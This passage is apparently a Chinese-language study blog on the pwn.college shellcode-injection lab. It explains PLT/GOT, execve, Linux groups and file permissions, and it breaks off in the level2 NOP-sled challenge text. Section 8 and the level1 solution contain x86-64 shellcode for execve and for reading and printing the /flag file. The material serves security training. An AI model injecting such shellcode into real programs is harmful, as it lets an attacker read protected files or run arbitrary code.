        <content type="html"><![CDATA[<h1 id="pwn-college-Shellcode-Injection"><a href="#pwn-college-Shellcode-Injection" class="headerlink" title="pwn.college Shellcode-Injection"></a>pwn.college Shellcode-Injection</h1><p><a href="https://pwn.college/program-security/shellcode-injection/">https://pwn.college/program-security/shellcode-injection/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-PLT-和-GOT-有什么区别和联系"><a href="#1-PLT-和-GOT-有什么区别和联系" class="headerlink" title="1. PLT 和 GOT 有什么区别和联系"></a>1. PLT 和 GOT 有什么区别和联系</h3><p>PLT(Procedure Linkage Table) 和 GOT（Global offset Table）是ELF(Executable and Linkable Format)文件中用于动态链接的重要机制。他们协同工作来实现动态库函数的调用。</p><p>PLT(Procedure Linkage Table)</p><ul><li>位置：PLT位于可执行文件的代码段(.text段)中。</li><li>结构：PLT包含一系列跳转指令，这些指令在程序首次调用某个外部函数时，会跳转到一个存根stub代码，然后由动态链接器解析实际地址并修正跳转目标。</li><li>功能：延时绑定，PLT实现了延时绑定，即在程序运行时，只有在函数被第一次调用时，才会解析函数地址并跳转目标。PLT中的每个条目都是一个间接跳转，通过跳转到GOT中存储的地址来实现函数调用。</li></ul><p>GOT(Global Offset Table)</p><ul><li>位置：GOT位于可执行文件的数据段(.data段或.got段)中。</li><li>结构：GOT包含指向全局变量和外部函数地址的指针。在动态链接过程中，这些指针会被更新为实际的地址。</li><li>地址存储，GOT存储了外部函数和全局变量的实际地址，供程序在运行时使用。</li><li>动态链接：在程序加载时，动态链接器会解析并填充GOT表项。使得程序可以正确调用动态库中的函数和访问全局变量。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">程序调用 -&gt; PLT 条目 -&gt; GOT 表项 -&gt; 动态链接器 (第一次) -&gt; 解析并更新 GOT&#x2F;PLT -&gt; 实际函数          -&gt; PLT 条目 -&gt; GOT 表项 -&gt; 实际函数 (后续)GOT显示.&#x2F;babyshell_level1:     file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET           TYPE              VALUE 0000000000003d40 R_X86_64_RELATIVE  *ABS*+0x00000000000012e00000000000003d48 R_X86_64_RELATIVE  *ABS*+0x00000000000012a00000000000004008 R_X86_64_RELATIVE  *ABS*+0x00000000000040080000000000003fd8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable0000000000003fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.50000000000003fe8 R_X86_64_GLOB_DAT  __gmon_start__0000000000003ff0 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable0000000000003ff8 R_X86_64_GLOB_DAT  __cxa_finalize@GLIBC_2.2.50000000000004010 R_X86_64_COPY     stdout@@GLIBC_2.2.50000000000004020 R_X86_64_COPY     stdin@@GLIBC_2.2.50000000000003f68 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.50000000000003f70 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.50000000000003f78 R_X86_64_JUMP_SLOT  cs_free0000000000003f80 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.50000000000003f88 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.40000000000003f90 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.50000000000003f98 R_X86_64_JUMP_SLOT  __assert_fail@GLIBC_2.2.50000000000003fa0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.50000000000003fa8 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.50000000000003fb0 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.50000000000003fb8 R_X86_64_JUMP_SLOT  cs_disasm0000000000003fc0 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.50000000000003fc8 R_X86_64_JUMP_SLOT  cs_open0000000000003fd0 R_X86_64_JUMP_SLOT  cs_closePLT显示babyshell_level1:     file format elf64-x86-64Disassembly of section .plt:0000000000001020 &lt;.plt&gt;:    1020:       ff 35 32 2f 00 00       pushq  0x2f32(%rip)        # 3f58 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;    1026:       f2 ff 25 33 2f 00 00    bnd jmpq *0x2f33(%rip)        # 3f60 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;    102d:       0f 1f 00                nopl   (%rax)    1030:       f3 0f 1e fa             endbr64     1034:       68 00 00 00 00          pushq  $0x0    1039:       f2 e9 e1 ff ff ff       bnd jmpq 1020 &lt;.plt&gt;    103f:       90                      nop    1040:       f3 0f 1e fa             endbr64     1044:       68 01 00 00 00          pushq  $0x1    1049:       f2 e9 d1 ff ff ff       bnd jmpq 1020 &lt;.plt&gt;    104f:       90                      nop    1050:       f3 0f 1e fa             endbr64     1054:       68 02 00 00 00          pushq  $0x2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-为什么要同时设计PLT和GOT表项"><a href="#2-为什么要同时设计PLT和GOT表项" class="headerlink" title="2. 为什么要同时设计PLT和GOT表项"></a>2. 为什么要同时设计PLT和GOT表项</h3><p>设计 PLT（Procedure Linkage Table）和 GOT（Global Offset Table）的目的是为了实现动态链接的高效和灵活。虽然理论上可以只用 PLT 来实现动态链接，但分开设计 PLT 和 GOT 有多个好处，下面解释其中的原因。</p><p>动态链接的基本目标</p><ul><li>延迟绑定（Lazy Binding）：在程序执行过程中，只在函数被首次调用时才解析其地址，减少启动时间。</li><li>位置无关代码（Position-Independent Code, PIC）：使得程序或共享库可以在内存中任意位置加载，提高内存利用率和安全性。</li><li>降低开销：减少每次调用动态函数时的性能开销。</li></ul><p>为什么分开设计 PLT 和 GOT</p><ol><li>分离代码和数据：<br> PLT：位于代码段，包含跳转指令和间接跳转表的索引。<br> GOT：位于数据段，包含实际函数和变量地址。<br> 分离使得代码段可以保持只读，有助于提高安全性（如防止代码段被修改）。</li><li>延迟绑定实现：<br> 首次调用：通过 PLT 条目跳转到 GOT 中的动态链接器解析函数。<br> 解析后：动态链接器更新 GOT 表项，指向实际函数地址。之后的调用直接通过 GOT 跳转到实际函数地址，减少开销。<br> 这种机制使得每个动态函数的地址只在第一次调用时解析一次，之后调用的开销很低。</li><li>位置无关代码支持：<br> GOT 表项：在加载时由动态链接器填充，提供实际地址，使得代码可以在任意位置加载。<br> PLT 表项：通过相对地址引用 GOT 表项，实现位置无关。</li><li>简化动态链接器实现：<br> 动态链接器可以集中管理 GOT 表项，解析并填充实际地址。<br> 更新 PLT 表项和 GOT 表项可以分别处理，简化动态链接器的逻辑。</li><li>提高效率：<br> 运行时性能：首次调用动态函数时，通过 PLT 跳转到动态链接器处理，之后通过 GOT 直接跳转到函数地址，减少每次调用的性能开销。<br> 内存使用：数据段中的 GOT 可以在程序运行时动态修改，而代码段中的 PLT 可以保持只读，提高内存保护的有效性。</li></ol><ul><li>PLT 和 GOT 的协同工作机制<ul><li>PLT 条目：存储间接跳转指令，通过 GOT 表项获取实际函数地址。</li><li>GOT 表项：初始指向动态链接器解析函数，解析后指向实际函数地址。</li></ul></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">示例：调用 printf 函数的流程1. 初始状态：    PLT 表项指向 GOT 表项。    GOT 表项指向动态链接器解析函数。2. 第一次调用：    调用 PLT 条目，跳转到 GOT 表项。    GOT 表项指向动态链接器，解析 printf 的实际地址。    动态链接器更新 GOT 表项，指向 printf 的实际地址。3. 后续调用：    PLT 通过 GOT 表项直接跳转到 printf 的实际地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>总结<br>PLT 和 GOT 分开设计的主要原因是为了实现高效、灵活和安全的动态链接机制。通过分离代码和数据、支持延迟绑定和位置无关代码，PLT 和 GOT 提供了一种有效的动态链接解决方案。虽然理论上可以只用 PLT，但分开设计带来了更好的性能和安全性。</li></ul><h3 id="3-nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？"><a href="#3-nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？" class="headerlink" title="3. nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？"></a>3. nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？</h3><p>在使用 NASM 编译汇编代码时，汇编器会将各个段（section）放置在目标文件中的不同位置。具体位置取决于目标文件格式，例如二进制文件、ELF 文件或其他格式。以下是几种常见目标文件格式及其段的放置位置和排列方式：</p><ol><li>二进制文件格式（-f bin）<br>二进制文件格式是最简单的格式，所有段都直接放在输出文件中，没有额外的头信息。</li></ol><p>.text 段：通常放在文件的起始位置。<br>.data 段：紧随 .text 段之后。<br>.bss 段：紧随 .data 段之后，但由于 .bss 段不包含初始化数据，通常在二进制文件中没有对应的部分，而是留出相应的空间。</p><pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| .text 段 (代码)   |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| .data 段 (已初始化数据) |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>ELF 文件格式（-f elf64）<br>ELF（Executable and Linkable Format）文件格式用于更复杂的可执行文件和共享库，包含详细的段信息和符号表。</li></ol><p>.text 段：放在文件的代码段，包含可执行代码。<br>.data 段：放在文件的数据段，包含已初始化的数据。<br>.bss 段：放在文件的未初始化数据段，在运行时初始化为零。</p><pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| ELF 文件头        |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| 程序头表         |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| .text 段 (代码)   |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| .data 段 (已初始化数据) |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| .bss 段 (未初始化数据)  |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span>| 段头表           |<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">-------------------+</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-关于execve函数"><a href="#4-关于execve函数" class="headerlink" title="4. 关于execve函数"></a>4. 关于execve函数</h3><p>execve 函数是一个系统调用，它用于在当前进程中执行一个新的程序。这个函数的声明通常在头文件 &lt;unistd.h&gt; 中，并且它是执行程序的最底层的接口之一。与其他 exec 系列函数不同，execve 允许直接指定要执行的程序文件路径、参数列表和环境变量列表。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>pathname<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token keyword">const</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数</p><ul><li>pathname：这是一个指向要执行的程序文件路径的指针。可以是绝对路径或相对路径。</li><li>argv：这是一个指向字符串数组的指针，这些字符串是传递给新程序的参数列表。数组的最后一个元素必须是 NULL 指针，以标识参数列表的结束。</li><li>envp：这是一个指向字符串数组的指针，这些字符串是新程序的环境变量。数组的最后一个元素也必须是 NULL 指针，以标识环境变量列表的结束。</li></ul><p>返回值</p><ul><li>成功：execve 函数没有返回值。如果执行成功，新的程序将替换当前进程的地址空间，原程序的代码将不会继续执行。</li><li>失败：返回 -1，并设置 errno 来指示错误类型。</li></ul><p><strong>解释</strong><br>类似将执行代码替换成了新程序的代码，其他的都没变。</p><p>当 execve 成功执行时，当前进程的地址空间、堆栈、堆等都会被新程序替换。新程序从它的入口点开始执行，通常是 main 函数。当前进程的 PID 和打开的文件描述符等保持不变。execve 成功执行时，新程序会继承当前进程的权限和某些属性。具体来说，新进程继承的属性包括：</p><ol><li>进程ID（PID）和父进程ID（PPID）：新程序继承当前进程的PID和PPID，因此它在系统中的位置和关系保持不变。</li><li>用户和组ID：新程序继承当前进程的有效用户ID（EUID）、有效组ID（EGID）、真实用户ID（RUID）和真实组ID（RGID），这意味着它具有与当前进程相同的权限。</li><li>文件描述符：当前进程中打开的文件描述符会被继承，包括标准输入、标准输出和标准错误。如果文件描述符没有被标记为在执行新程序时关闭（即没有设置FD_CLOEXEC标志），它们会保持打开状态。</li><li>环境变量：execve传递的环境变量列表会被新程序继承。虽然可以通过参数传递一个新的环境变量列表，但如果传递的是当前环境变量列表，新程序将继承这些环境变量。</li><li>当前工作目录：新程序继承当前进程的工作目录。</li><li>资源限制：当前进程的资源限制（如CPU时间限制、文件大小限制等）会被新程序继承。</li><li>信号处理：新程序继承当前进程的信号屏蔽字，但信号处理程序将被重置为默认值。</li><li>进程组和会话：新程序继承当前进程所属的进程组和会话。</li></ol><h3 id="5-为什么设计了进程还要设计线程"><a href="#5-为什么设计了进程还要设计线程" class="headerlink" title="5. 为什么设计了进程还要设计线程"></a>5. 为什么设计了进程还要设计线程</h3><p>进程和线程是操作系统中两种基本的计算资源管理方式。它们各自有不同的特点和用途：</p><p>进程 (Process)</p><ul><li>定义：进程是操作系统分配资源（如内存、文件句柄等）的基本单位。每个进程都有独立的地址空间，并且通常包含多个线程。</li><li>地址空间：每个进程有自己独立的地址空间，一个进程中的数据不能被另一个进程直接访问。</li><li>资源开销：进程的创建和切换需要较多的资源和时间，因为涉及到完整的环境（包括内存空间和系统资源）的设置和保存。</li><li>安全性：由于进程之间的地址空间是独立的，一个进程的崩溃不会直接影响到其他进程，提高了系统的稳定性和安全性。</li></ul><p>线程 (Thread)</p><ul><li>定义：线程是进程中的一个执行单元，是CPU调度和执行的基本单位。一个进程可以包含一个或多个线程，这些线程共享进程的- 资源（如内存、文件句柄等）。</li><li>地址空间：线程共享同一个进程的地址空间和资源，因此线程之间可以直接访问彼此的数据。</li><li>资源开销：线程的创建和切换所需的资源和时间比进程少，因为线程之间共享资源，不需要像进程那样进行完整的环境设置和保存。</li><li>性能：由于线程共享进程的资源，线程间通信比进程间通信更加高效。线程适合需要频繁切换和快速响应的任务。</li></ul><p>为什么有了进程还要设计线程？</p><ul><li>提高并发性：线程允许在同一个进程内同时执行多个任务，提高了程序的并发性和效率，特别是在多核处理器上，能够更充分地利用CPU资源。</li><li>降低开销：线程的创建和切换比进程更轻量，适合需要快速响应和频繁切换的场景，如实时系统和交互式应用。</li><li>简化开发：线程之间共享同一进程的内存和资源，使得在同一进程内进行数据共享和通信更加简单和高效。对于需要大量数据共享的应用，使用线程可以简化开发复杂性。</li><li>资源共享：由于线程共享同一进程的资源，多个线程可以方便地访问和操作同一数据结构和资源，适合于需要高效访问共享资源的应用。</li></ul><p>总的来说，进程和线程各自有不同的应用场景和优势。进程提供了更高的隔离性和安全性，适合独立运行的任务；线程提供了更高的并发性和效率，适合需要快速响应和高效共享资源的任务。结合使用进程和线程，可以更好地满足不同类型应用的需求。</p><p><strong>进程的例子</strong></p><ul><li>独立的应用程序：例如，一个浏览器和一个文本编辑器是两个独立的应用程序，它们分别运行在自己的进程中。浏览器的崩溃不会影响文本编辑器，反之亦然。</li><li>服务器进程：例如，一个Web服务器（如Apache或Nginx）运行在一个独立的进程中。它可以通过生成子进程来处理不同的客户端请求。</li></ul><p><strong>线程的例子</strong></p><ul><li>多任务处理：例如，一个文本编辑器在编辑文档的同时可以进行拼写检查和自动保存。这些任务可以在不同的线程中并行执行。</li><li>网络服务：例如，一个Web服务器可以为每个客户端请求分配一个线程，以便同时处理多个请求，提高响应速度。</li></ul><h3 id="6-Linux系统中组的含义"><a href="#6-Linux系统中组的含义" class="headerlink" title="6. Linux系统中组的含义"></a>6. Linux系统中组的含义</h3><p>在Linux系统中，组（group）是用户的一种分类方式，用于管理用户的权限和访问控制。每个用户可以属于一个或多个组，进而影响该用户或进程对系统资源的访问权限。进程所属的组ID列表表示该进程的所有者用户所属的所有组ID。</p><p><strong>组ID的含义</strong><br>组ID（GID）：每个组都有一个唯一的组ID（GID）。组ID用于标识组，就像用户ID（UID）用于标识用户一样。</p><p><strong>Groups 字段的含义</strong><br>在 <code>/proc/[pid]/status</code> 文件中的 <code>Groups</code> 字段列出了进程所有者所属的所有组的组ID。这些组ID决定了进程在文件系统和系统资源访问权限方面的行为。例如，如果一个文件的组所有者与进程的组ID列表中的一个匹配，那么进程将使用文件的组权限进行访问。</p><p>示例分析:</p><p>假设你看到以下 Groups 字段：</p><p>Groups: 4 24 27 30 46 122 135 136 1000<br>这表示该进程的所有者用户属于以下组：</p><pre class="line-numbers language-none"><code class="language-none">GID 4GID 24GID 27GID 30GID 46GID 122GID 135GID 136GID 1000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些组ID对应的组名可以在 /etc/group 文件中找到。每行格式如下：group_name:x:GID:group_list</p><p>示例：查看组名<br>假设你有一个GID列表 4 24 27 30 46 122 135 136 1000，你想知道这些GID对应的组名，你可以查看 /etc/group 文件<code>cat /etc/group | grep -E &#39;:(4|24|27|30|46|122|135|136|1000)</code></p><p>示例输出可能如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adm:x:4:syslog,lebroncdrom:x:24:lebronsudo:x:27:lebrondip:x:30:lebronplugdev:x:46:lebronlpadmin:x:122:lebronsambashare:x:135:lebronlibvirt:x:136:lebronlebron:x:1000:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样你就可以确定GID对应的组名了：</p><pre class="line-numbers language-none"><code class="language-none">GID 4: admGID 24: cdromGID 27: sudoGID 30: dipGID 46: plugdevGID 122: lpadminGID 135: sambashareGID 136: libvirtGID 1000: lebron<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些组信息对进程的访问控制有直接影响。如果某个文件的组权限设置为读/写/执行，并且该文件的组所有者是 cdrom（GID 24），那么任何属于 cdrom 组的用户（如 lebron）都可以根据组权限访问该文件。同样，如果进程需要访问某些受限资源（如设备文件），它必须运行在合适的组权限下。</p><h3 id="7-dev-tty是什么？"><a href="#7-dev-tty是什么？" class="headerlink" title="7. /dev/tty是什么？"></a>7. /dev/tty是什么？</h3><p><code>/dev/tty</code> 是 Unix 和类 Unix 操作系统中的一个设备文件，代表当前进程的控制终端（terminal）。下面是一些关于 <code>/dev/tty</code> 的详细解释：</p><p>定义和作用：</p><p><code>/dev/tty</code> 是一个设备文件，指向与当前进程相关联的终端设备。不论进程是通过命令行运行还是通过图形界面终端运行，<code>/dev/tty</code> 都会指向那个特定的终端设备。它用于提供标准输入、标准输出和标准错误输出的接口，使进程能够与用户进行交互。<br>历史背景：</p><p>“TTY” 原本是电传打字机（teletypewriter）的缩写，这是一种早期的电子通信设备。随着计算机技术的发展，“TTY” 这个术语被保留了下来，表示计算机终端或虚拟终端。<br>常见用法：</p><p>重定向输入输出：进程可以通过重定向标准输入、标准输出和标准错误到 /dev/tty 来确保其输出被显示在终端上。例如：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/tty"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将标准输出重定向到 /dev/tty</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查终端状态：使用 isatty 函数来检查文件描述符是否指向终端设备。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Standard input is a terminal.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Standard input is not a terminal.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关设备文件：</p><p><code>/dev/console</code>：代表系统控制台设备，通常是系统的主要显示和输入设备。<br><code>/dev/pts/*</code>：表示伪终端设备，用于实现虚拟终端，如通过 SSH 连接的终端。<br><code>/dev/null</code>：特殊设备文件，丢弃所有写入的数据，读取时返回 EOF。<br>通过这些设备文件，Unix 和类 Unix 系统提供了一种灵活的方式来管理和使用各种终端设备，使得系统管理和编程变得更加方便和直观。</p><h3 id="8-系统调用的路径问题"><a href="#8-系统调用的路径问题" class="headerlink" title="8. 系统调用的路径问题"></a>8. 系统调用的路径问题</h3><p>当系统调用（如 execve、chmod 等）传入相对路径时，操作系统会根据当前工作目录解析该路径。当前工作目录是进程的属性，通常是进程启动时的目录。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">push 0x31  &#x2F;* ASCII  &#39;1&#39; *&#x2F;mov rdi, rsppush 0pop rsixor edx, edxpush 0x3bpop raxsyscallpush 0x31: 将字符 &#39;1&#39; 的 ASCII 值 0x31 压入栈中。mov rdi, rsp: 将栈指针 rsp 的当前值（此时指向字符 &#39;1&#39;）加载到寄存器 rdi 中。rdi 是 execve 系统调用的第一个参数，用于指向可执行文件路径。push 0: 将值 0 压入栈中。pop rsi: 将栈顶的值 0 弹出到寄存器 rsi 中。rsi 是 execve 系统调用的第二个参数，用于传递命令行参数数组（argv），这里传递空指针。xor edx, edx: 将寄存器 edx 置零。edx 是 execve 系统调用的第三个参数，用于传递环境变量数组（envp），这里传递空指针。push 0x3b: 将 execve 系统调用号 0x3b（59）压入栈中。pop rax: 将栈顶的值 59 弹出到寄存器 rax 中。rax 用于存储系统调用号。syscall: 执行系统调用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行效果</strong></p><ul><li>rdi 包含相对路径 “1” 的地址。</li><li>execve 系统调用将使用相对路径 “1”。</li><li>内核会根据当前工作目录解析相对路径 “1”</li></ul><h3 id="9-Linux系统文件权限"><a href="#9-Linux系统文件权限" class="headerlink" title="9. Linux系统文件权限"></a>9. Linux系统文件权限</h3><p>文件权限是 UNIX 和类 UNIX 操作系统中的一个核心概念，它们决定了谁可以读取、写入和执行文件。文件权限由三组数字组成，每组数字代表一个不同的用户类别的权限：</p><ul><li>用户（User, u）: 文件的所有者。</li><li>组（Group, g）: 与文件所有者同组的用户。</li><li>其他用户（Others, o）: 系统上所有其他用户。</li></ul><p>相当于每个用户类别由3位2进制数组成组成，最高位代表是否可读，中间位代表是否可写，最低位代表是否可以执行。</p><p><strong>文件权限的表示法</strong><br>文件权限可以用三位八进制数表示，每位数字代表一组权限。每个权限位的值如下：</p><ul><li>4: 读权限（r, read）</li><li>2: 写权限（w, write）</li><li>1: 执行权限（x, execute）</li></ul><p>这三种权限可以组合起来，形成不同的权限设置：</p><ul><li>7: 读、写和执行（4 + 2 + 1 = 7）</li><li>6: 读和写（4 + 2 = 6）</li><li>5: 读和执行（4 + 1 = 5）</li><li>4: 只有读（4）</li><li>3: 写和执行（2 + 1 = 3）</li><li>2: 只有写（2）</li><li>1: 只有执行（1）</li><li>0: 无权限（0）</li></ul><p><strong>常见权限设置</strong></p><p><strong>600</strong></p><ul><li><strong>用户（所有者）</strong>: 读和写（6）</li><li><strong>组</strong>: 无权限（0）</li><li><strong>其他用户</strong>: 无权限（0）</li></ul><p>权限表示：</p><pre class="line-numbers language-none"><code class="language-none">-rw------- (600)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>644</strong></p><ul><li><strong>用户（所有者）</strong>: 读和写（6）</li><li><strong>组</strong>: 读（4）</li><li><strong>其他用户</strong>: 读（4）</li></ul><p>权限表示：</p><pre class="line-numbers language-none"><code class="language-none">-rw-r--r-- (644)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>755</strong></p><ul><li><strong>用户（所有者）</strong>: 读、写和执行（7）</li><li><strong>组</strong>: 读和执行（5）</li><li><strong>其他用户</strong>: 读和执行（5）</li></ul><p>权限表示：</p><pre class="line-numbers language-none"><code class="language-none">-rwxr-xr-x (755)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>777</strong></p><ul><li><strong>用户（所有者）</strong>: 读、写和执行（7）</li><li><strong>组</strong>: 读、写和执行（7）</li><li><strong>其他用户</strong>: 读、写和执行（7）</li></ul><p>权限表示：</p><pre class="line-numbers language-none"><code class="language-none">-rwxrwxrwx (777)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h3><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>这个题可以用nasm直接编译汇编语言，我居然还在用python，写汇编语言的二进制表示然后再写入文件中。因为我卡在了不知道把字符串应该放在哪里？到底是放在baby程序的栈中，还是放在我的代码的最后部分。其实是一致的，因为你所有的输入都在baby程序的栈中，只不过位置不同。</p><p>nasm编译汇编语言，居然可以指定段中的数据。而且这里使用的都是系统调用，不用再通过plt段获取一些动态链接函数的地址了。</p><p>利用程序</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">BITS 64section .data    filename db &#39;&#x2F;flag&#39;, 0    ; 文件路径需要替换为正确的路径section .bss    buffer resb 100                   ; 100 字节缓冲区section .textglobal _start_start:    ; open(&quot;filename&quot;, O_RDONLY)    xor rax, rax    mov rax, 2                        ; SYS_open    lea rdi, [rel filename]    xor rsi, rsi                      ; O_RDONLY &#x3D; 0    syscall    ; 检查 open 的返回值    test rax, rax    js error                          ; 如果打开文件失败，跳转到错误处理    ; read(fd, buffer, 100)    mov rdi, rax                      ; fd    lea rsi, [rel buffer]    mov rdx, 100                      ; 读取 100 字节    xor rax, rax                      ; SYS_read    syscall    ; write(1, buffer, rax)    mov rdi, 1                        ; stdout    mov rdx, rax                      ; 读取的字节数    mov rax, 1                        ; SYS_write    syscall    ; exit(0)    xor rdi, rdi                      ; 返回码 0    mov rax, 60                       ; SYS_exit    syscallerror:    ; exit(1)    mov rdi, 1                        ; 返回码 1    mov rax, 60                       ; SYS_exit    syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>这一关相较于上一关，在shellcode运行之前，程序随机跳过开始的0x800个字节。所以我们需要在程序开始之前的0x800个字节添加NOP指令。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Executing filter...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"execute and then your real shellcode will run. This concept is called a `nop sled`.\n"</span><span class="token 